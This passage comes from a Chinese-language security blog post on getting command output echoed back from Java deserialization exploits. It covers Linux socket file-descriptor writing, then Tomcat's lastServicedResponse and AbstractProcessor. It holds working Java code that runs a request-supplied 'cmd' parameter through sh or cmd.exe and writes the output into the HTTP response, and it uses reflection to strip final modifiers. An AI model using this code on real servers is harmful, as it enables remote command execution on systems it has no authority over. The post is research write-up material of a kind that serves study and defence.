&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = Integer.parseInt(((String)res2.get(index)).split(<span class="string">"\\s"</span>)[<span class="number">0</span>]); <span class="comment">//获取到Inode最大的文件描述符fd的值。</span></span><br><span class="line">        java.lang.reflect.Constructor c= java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]&#123;Integer.TYPE&#125;);//获取FileDescriptor的构造器</span><br><span class="line">        c.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"id"</span>&#125;;</span><br><span class="line">        String res = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next(); <span class="comment">//执行我们想要执行的命令</span></span><br><span class="line">        String result = <span class="string">"HTTP/1.1 200 OK\nConnection: close\nContent-Length: "</span> + res.length() + <span class="string">"\n\n"</span> + res + <span class="string">"\n"</span>;</span><br><span class="line">        java.io.FileOutputStream os = <span class="keyword">new</span> java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(<span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> Integer(fd)&#125;)); <span class="comment">//获取通过fd获取socket的FileOutputStream输出流</span></span><br><span class="line">        os.write(result.getBytes()); <span class="comment">// 将命令执行的结果进行写入</span></span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>​        通过这种方式可以增加找到我们本次socket请求的概率，但是也不能保证写入的一定是我们本次请求的socket。如果写入的不是我们本次请求的socket，则可能会导致异常。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222163940568.png" alt="image-20201222163940568"></p>
<h3 id="Tomcat回显"><a href="#Tomcat回显" class="headerlink" title="Tomcat回显"></a>Tomcat回显</h3><h4 id="lastServicedResponse获取response对象"><a href="#lastServicedResponse获取response对象" class="headerlink" title="lastServicedResponse获取response对象"></a>lastServicedResponse获取response对象</h4><p>​        之前我们了解了windows和Linux的回显方法，这些方法的基本思路是找到我们请求的那条数据的socket的文件描述符，向请求的响应中写入命令执行的结果，那么我们能不能在http层面去获取到当前HTTP请求的响应，并在响应中写入我们的回显。在java web中存在HttpServletResponse和HttpServletResponse对象，通过这两个对象我们可以对请求和响应进行处理，比如我们可以通过<code>response.getWriter().write()</code>将响应内容发送到缓冲区，并刷新缓冲区发送回显，测试代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">index</span><span class="params">(String input, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String xxx=<span class="string">"test666"</span>;</span><br><span class="line">    Writer writer = response.getWriter();</span><br><span class="line">    writer.write(xxx);</span><br><span class="line">    writer.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222174453051.png" alt="image-20201222174453051"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222174459580.png" alt="image-20201222174459580"></p>
<p>​        这个是我们直接修改源代码实现的结果，在实际使用过程中我们可能是需要通过反射来执行命令的，<strong>我们如何才能通过反射调用获取本次请求的response对象？</strong></p>
<p>​        一般来说，HttpServletResponse实例化的对象已经被加载到内存中，我们无法通过反射调用来获取这个对象中的内容，所以比较好的方法是去寻找HttpServletResponse对象在哪里被存储过，再通过反射调用获取存储HttpServletResponse的变量的值，再调用write将命令执行的结果写入返回内容。</p>
<p>​        参考先知上<code>Tomcat中一种半通用回显方法</code>,作者发现了ApplicationFilterChain的lastServicedResponse记录了response的内容。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181211815.png" alt="image-20201222181211815"></p>
<p>​        因此我们可以通过调用getLastServicedResponse来获取ServletResponse对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181321356.png" alt="image-20201222181321356"></p>
<p>​        我们还需要确定response的对象在整个传输链中代表的是否是一个对象，我将执行到index是的response对象和ApplicationFilterChain中的response对象做一个对比，发现是一个对象，所以我们在ApplicationFilterChain获取的response</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181748658.png" alt="image-20201222181748658"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181935267.png" alt="image-20201222181935267"></p>
<p>​        而且lastServicedResponse是static final修饰的，也就是说这个属性一旦赋值后就不能更改。并且还通过ThreadLocal进行修饰，这代表这个属性只能在当前线程中进行调用。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222183335083.png" alt="image-20201222183335083"></p>
<p>​        但是想要执行到赋值操作，需要ApplicationDispatcher.WRAP_SAME_OBJECT的属性为true，但是这个属性默认为false,也就是说默认不会执行这个赋值语句。所以我们需要通过反射来获取ApplicationDispatcher.WRAP_SAME_OBJECT属性，并对这个属性的值进行更改。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222191217452.png" alt="image-20201222191217452"></p>
<p>​        通过上面的分析，要通过这种思路完成tomcat下的回显 ，需要如下步骤</p>
<ul>
<li><p>通过反射获取WRAP_SAME_OBJECT_FIELD，并将这个值设置为true</p>
</li>
<li><p>通过反射获取lastServicedRequest和lastServicedResponse属性，从lastServicedRequest获取当前的request对象，通过request对象获取请求参数。通过lastServicedResponse获取response对象，并获取到response的write方法。</p>
</li>
<li><p>执行命令并将命令执行的结果写入到response中。</p>
<p>由于我们需要修改的属性lastServicedRequest和lastServicedResponse都是final static修饰的变量，因此，我们得了解如何通过反射来设置final static修饰的变量。</p>
<p>​        我写了一个小Demo，代码如下：</p>
<p>test.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Final.Static;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String test666 = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getTest666</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> test666;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GetTest.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Final.Static;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field test666=test.class.getDeclaredField("test666");</span><br><span class="line">        test666.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        String test=(String)test666.get(<span class="keyword">null</span>);</span><br><span class="line">        test666.set(<span class="keyword">null</span>,<span class="string">"xxx"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        运行上面的代码，会返回如下报错，也就是说无法通过set方法给由final修饰的属性赋值，因为一般final代表的是一个常量，一般不允许我们去修改常量的值。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223092542124.png" alt="image-20201223092542124"></p>
<p>​        在Filed类中，可以通过getModifiers方法获取Filed的modifiers属性。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223092911018.png" alt="image-20201223092911018"></p>
<p>​    这个属性的值代表了用户的访问权限</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x00000001(十六进制) = 1(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PUBLIC           = <span class="number">1</span>;</span><br><span class="line"> <span class="comment">//0x00000002(十六进制) = 2(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PRIVATE          = <span class="number">2</span>;   </span><br><span class="line"> <span class="comment">//0x00000004(十六进制) = 4(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PROTECTED        = <span class="number">4</span>;  </span><br><span class="line"> <span class="comment">//0x00000008(十六进制) = 8(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> STATIC           = <span class="number">8</span>;  </span><br><span class="line"> <span class="comment">//0x00000010(十六进制) = 16(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> FINAL            = <span class="number">16</span>;</span><br></pre></td></tr></table></figure>

<p>​        如果我们的修饰符是由<code>private static final</code>来修饰的,modifiers属性的值也就是26。所以我们如果要对final修饰的变量进行赋值，就要重新设置这个变量的modifiers属性。代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Final.Static;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field test666=test.class.getDeclaredField("test666");</span><br><span class="line">        Field  modifiersField = Field.class.getDeclaredField("modifiers");  //获取Field类的modifiers属性</span><br><span class="line">        modifiersField.setAccessible(<span class="keyword">true</span>);  <span class="comment">//设置属性的访问权限</span></span><br><span class="line">        modifiersField.setInt(test666, test666.getModifiers() &amp; ~Modifier.FINAL); <span class="comment">//重新设置test666变量的modifiers属性</span></span><br><span class="line">        test666.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        String test=(String)test666.get(<span class="keyword">null</span>);</span><br><span class="line">        test666.set(<span class="keyword">null</span>,<span class="string">"xxx"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        运行该代码，我们可以看到，没有设置前test666变量的modifiers属性为26，设置后更改为10，也就是去掉了test666变量的final修饰符。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223093651210.png" alt="image-20201223093651210"></p>
</li>
</ul>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223093748773.png" alt="image-20201223093748773"></p>
<p>​        理解了这个知识点，我们来看一下使用tomcat回显的整体代码实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Field WRAP_SAME_OBJECT_FIELD = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>).getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);  <span class="comment">//获取ApplicationDispatcher类的WRAP_SAME_OBJECT属性。</span></span><br><span class="line">     Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest"); //获取ApplicationFilterChain的lastServicedRequest属性</span><br><span class="line">     Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse"); //获取ApplicationFilterChain的lastServicedResponse属性</span><br><span class="line">     Field  modifiersField = Field.class.getDeclaredField("modifiers"); //获取Field的modifiers属性</span><br><span class="line">     modifiersField.setAccessible(<span class="keyword">true</span>); <span class="comment">//这个属性是由private修饰的，所以需要设置访问权限</span></span><br><span class="line">     modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL); <span class="comment">//去掉WRAP_SAME_OBJECT_FIELD的final修饰</span></span><br><span class="line">     modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);<span class="comment">//去掉lastServicedRequestField的final修饰</span></span><br><span class="line">     modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);<span class="comment">//去掉lastServicedResponseField的final修饰</span></span><br><span class="line">     WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">     lastServicedRequestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">     lastServicedResponseField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">     ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="keyword">null</span>); <span class="comment">//静态变量是和对象无关的，因此可以通过传入null来获取这个变量的内容。</span></span><br><span class="line">     ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="keyword">null</span>);<span class="comment">//静态变量是和对象无关的，因此可以通过传入null来获取这个变量的内容。lastServicedRequest进行初始化</span></span><br><span class="line">     <span class="keyword">boolean</span> WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="keyword">null</span>); <span class="comment">//静态变量是和对象无关的，因此可以通过传入null来获取这个变量的内容。</span></span><br><span class="line">     String cmd = lastServicedRequest != <span class="keyword">null</span></span><br><span class="line">             ? lastServicedRequest.get().getParameter(<span class="string">"cmd"</span>)</span><br><span class="line">             : <span class="keyword">null</span>; <span class="comment">//判断lastServicedRequest中是否为NULL，如果为NULL说明还不能获取request中的内容。</span></span><br><span class="line">     <span class="keyword">if</span> (!WRAP_SAME_OBJECT || lastServicedResponse == <span class="keyword">null</span> || lastServicedRequest == <span class="keyword">null</span>) &#123; <span class="comment">//判断WRAP_SAME_OBJECT是否为True,lastServicedResponse和lastServicedRequest内容是否为空</span></span><br><span class="line">         lastServicedRequestField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;()); <span class="comment">// 初始化lastServicedRequest</span></span><br><span class="line">         lastServicedResponseField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;()); <span class="comment">//初始化lastServicedResponse</span></span><br><span class="line">         WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="keyword">null</span>, <span class="keyword">true</span>); <span class="comment">//设置WRAP_SAME_OBJECT_FIELD属性为True</span></span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">         ServletResponse responseFacade = lastServicedResponse.get();</span><br><span class="line">         java.io.Writer w = responseFacade.getWriter(); <span class="comment">//获取response.writer</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">         String osTyp = System.getProperty(<span class="string">"os.name"</span>);</span><br><span class="line">         <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">"win"</span>)) &#123;</span><br><span class="line">             isLinux = <span class="keyword">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, cmd&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">         InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">         Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">         String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">         w.write(output);  <span class="comment">//写入命令执行结果</span></span><br><span class="line">         w.flush();</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>​        最后效果如下，由于第一次请求时WRAP_SAME_OBJECT_FIELD属性为false所以不会给lastServicedResponse赋值，因此在第一次访问时是无法获取命令执行结果的，后来再去请求，就可以正常执行命令了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223104155616.png" alt="image-20201223104155616"></p>
<h4 id="AbstractProcessor获取response对象"><a href="#AbstractProcessor获取response对象" class="headerlink" title="AbstractProcessor获取response对象"></a>AbstractProcessor获取response对象</h4><p>​        参考<code>基于全局储存的新思路 | Tomcat的一种通用回显方法研究</code>的文章，可以通过其他方法来寻找request和response对象被tomcat存储过的地方。经过寻找，发现AbstractProcessor中会存储request和response对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223113516089.png" alt="image-20201223113516089"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223113558202.png" alt="image-20201223113558202"></p>
<p>​        但是AbstractProcessor类的request和response不是由static修饰的，也就是说我们想要获取这两个属性，就需要获取到AbstractProcessor对象。在打断点调试的过程中，发现tomcat会去创建Http11Processor对象，而Http11Processor是AbstractProcessor的子类，所以我们只要获取到Http11Processor对象就可以了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223114132149.png" alt="image-20201223114132149"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223114257847.png" alt="image-20201223114257847"></p>
<p>​        所以需要查看哪里存储了processor对象，我们可以看到当获取了processor对象后，调用了register方法，并且传入了processor对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134031429.png" alt="image-20201223134031429"></p>
<p>​        在register中，获取了RequestInfo，并调用了setGlobalProcessor，并传入了this.global。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134142611.png" alt="image-20201223134142611"></p>
<p>​        传入的this.global也就是ConnectionHandler的global,而这个global是RequestGroupInfo对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223144452026.png" alt="image-20201223144452026"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223144535512.png" alt="image-20201223144535512"></p>
<p>​        跟进setGlobalProcessor,调用了addRequestProcessor并传入了this也就是requestInfo对象</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134402832.png" alt="image-20201223134402832"></p>
<p>​        继续跟进，将RequestInfo添加到了this.processors中</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134438913.png" alt="image-20201223134438913"></p>
<p>​        也就是将请求的requestinfo信息保存在了ConnectionHandler的global中。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223144922321.png" alt="image-20201223144922321"></p>
<p>​        所以我们现在也可以考虑先获取AbstractProtocol对象，经过查找发现CoyoteAdapter类调用了connector，而connector中包含了</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223145840694.png" alt="image-20201223145840694"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223145931811.png" alt="image-20201223145931811"></p>
<p>​        查看继承关系，可以发现ProtocolHandler为AbstractProtocol的接口。不同的请求协议的类型会调用不同的子类去进行处理。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223151356955.png" alt="image-20201223151356955"></p>
<p>​        所以我们如果可以找到connector对象，也可以间接获取request。在tomcat.java中，会将connector存储到Service对象中，所以我们只要可以获取Service对象就可以了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223152222218.png" alt="image-20201223152222218"></p>
<p>​        StandardService可以通过applicationContext来获取，applicationContext可以通过Context获取到，Context可以通过webappClassLoaderBase来获取,在Tomcat中通过webappClassLoader来加载web应用的calss文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tomcat的类加载器可以分为两部分，第一个是Tomcat自身所使用的类加载器，会加载jre的lib包及tomcat的lib包的类，遵循类加载的双亲委派机制；第二个是每个Web应用程序用的，每个web应用程序都有自己专用的WebappClassLoader，优先加载&#x2F;web-inf&#x2F;lib下的jar中的class文件，这样就隔离了每个web应用程序的影响，但是webappClassLoader没有遵循类加载的双亲委派机制，处理的方法就是在使用webappClassLoader的load加载类会进行过滤，如果有些类被过滤掉还是通过双亲委派机制优先从父加载器中加载类。</span><br></pre></td></tr></table></figure>

<p>​        我们有两种方式可以获取到webappClassLoader，一种是通过<code>Class.forName(&quot;webappClassLoader&quot;).getClassLoader()</code>,一种是通过<code>Thread.currentThread().getContextClassLoader()</code>来获取，我们对比一下这两种方式获取的ClassLoader有什么不同。<code>Thread.currentThread().getContextClassLoader()</code>是获取当前线程的类加载器。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Thread.currentThread().getContextClassLoader());     System.out.println(Class.forName(<span class="string">"org.apache.catalina.loader.WebappClassLoaderBase"</span>).getClassLoader());</span><br></pre></td></tr></table></figure>

<p>​        运行后我们可以看到通过Thread类获取的ClassLoader是TomcatEmbeddedWebappClassLoader类型的，而通过forName获取的是AppClassLoader类型，因此我们要获取WebappClassLoader，需要使用Thread来获取。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223170437936.png" alt="image-20201223170437936"></p>
<p>​        所以我们可以通过如下代码获取到TomcatEmbeddedWebappClassLoader</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader webappClassLoaderBase =(org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader) Thread.currentThread().getContextClassLoader();</span><br></pre></td></tr></table></figure>

<p>​        而TomcatEmbeddedWebappClassLoader是WebappClassLoaderBase的子类，也就是说这个TomcatEmbeddedWebappClassLoader本质上也是调用了tomcat自己实现的类加载器WebappClassLoaderBase来实现类加载的。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223171242354.png" alt="image-20201223171242354"></p>
<p>​    获取TomcatEmbeddedWebappClassLoader后，我们可以通过这个ClassLoader获取Context对象，再通过Context获取到applicationContext,也就可以获取到service对象了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.Context context=webappClassLoaderBase.getResources().getContext();</span><br><span class="line">           java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");</span><br><span class="line">           contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(context);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223173018910.png" alt="image-20201223173018910"></p>
<p>​        通过下面的代码获取application的service</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");</span><br><span class="line"></span><br><span class="line">serviceField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);</span><br></pre></td></tr></table></figure>

<p>​        获取到service后，通过service的findConnectors方法获取Connector。</p>
